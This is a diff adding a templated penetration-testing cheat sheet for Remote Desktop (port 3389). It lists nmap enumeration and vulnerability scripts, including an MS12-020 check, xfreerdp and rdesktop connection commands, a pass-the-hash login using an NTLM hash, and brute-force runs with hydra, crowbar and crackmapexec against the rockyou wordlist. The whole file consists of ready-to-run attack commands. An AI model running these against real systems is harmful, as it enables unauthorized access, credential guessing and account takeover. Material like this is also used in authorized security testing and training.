@@ -1,0 +1,14 @@
+# === NMAP RDP SCRIPTS ===
+nmap -sV --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner" -p 3389 {{TARGET}}
+
+# === CONNECTING ===
+xfreerdp3 /cert-ignore /bpp:8 /compression /u:{{USER}} /p:{{PASS}} /v:{{TARGET}}
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
+# With hash (pass the hash)
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /pth:{{NTLM_HASH}} /v:{{TARGET}}
+rdesktop -u {{USER}} -p {{PASS}} -g 1920x1080 {{TARGET}}
+
+# === BRUTE FORCE ===
+hydra -L users.txt -P passwords.txt -s 3389 rdp://{{TARGET}}
+crowbar -b rdp -s {{TARGET}}/32 -U users.txt -C /usr/share/wordlists/rockyou.txt
+crackmapexec rdp {{TARGET}} -u {{USER}} -p passwords.txt
